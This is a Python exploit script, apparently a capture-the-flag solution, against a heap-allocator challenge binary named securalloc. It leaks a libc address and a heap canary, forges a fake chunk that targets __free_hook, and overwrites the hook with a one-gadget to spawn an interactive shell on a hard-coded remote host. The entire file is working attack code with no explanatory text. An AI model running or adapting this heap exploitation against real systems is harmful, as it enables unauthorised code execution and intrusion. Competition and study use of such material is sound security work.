#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './securalloc.elf'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}, 'aslr':False}, \
                        local   = {'argv':[bin_file], 'env':{'LD_LIBRARY_PATH':'.'}}, \
                        remote  = {'host':'76.74.177.238', 'port':9001})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = 'libc.so.6')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stderr      = libc.symbols['_IO_2_1_stderr_']

#==========

def attack(conn, **kwargs):
    sa = Securalloc(conn)

    sa.create(0x58 - 0x10)
    sa.create(0x1c8 - 0x10)

    addr_libc_stderr = u(sa.show())
    libc.address = addr_libc_stderr - offset_libc_stderr
    info('addr_libc_base    = 0x{:012x}'.format(libc.address))
    addr_libc_free_hook = libc.symbols['__free_hook']
    addr_libc_onegadget = libc.address + 0x4526a

    sa.create(0x38)
    leak_urandom = sa.show()
    assert(len(leak_urandom) == 0x38)

    canary = u64('\x00' + leak_urandom[-7:])
    info('canary            = 0x{:016x}'.format(canary))

    sa.create(0x8)
    sa.delete()
    sa.create(0x68 - 0x10)
    sa.delete()
    sa.create(0x8)

    fake_chunk  = p64(0)
    fake_chunk += p64(canary)
    fake_chunk += p64(0x71)
    fake_chunk += p64(addr_libc_free_hook - 0x1093)
    sa.edit(fake_chunk)

    sa.create(0x58)
    sa.create(0x58)

    exploit  = '\x00'*0x58
    exploit += p64(canary)
    exploit  = exploit.ljust(0x107b, '\x00')
    exploit += p64(addr_libc_onegadget)
    sa.edit(exploit)

    sa.delete()
    
class Securalloc:
    def __init__(self, conn):
        self.recvuntil      = conn.recvuntil
        self.recv           = conn.recv
        self.sendline       = conn.sendline
        self.send           = conn.send
        self.sendlineafter  = conn.sendlineafter
        self.sendafter      = conn.sendafter

    def create(self, size):
        self.sendlineafter('> ', '1')
        self.sendlineafter('Size: ', str(size))

    def edit(self, data):
        self.sendlineafter('> ', '2')
        self.sendlineafter('Data: ', data)

    def show(self):
        self.sendlineafter('> ', '3')
        self.recvuntil('Data: ')
        return self.recvuntil('\n=', drop=True)

    def delete(self):
        self.sendlineafter('> ', '4')

#==========

if __name__=='__main__':
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.connection.interactive()
    
#==========
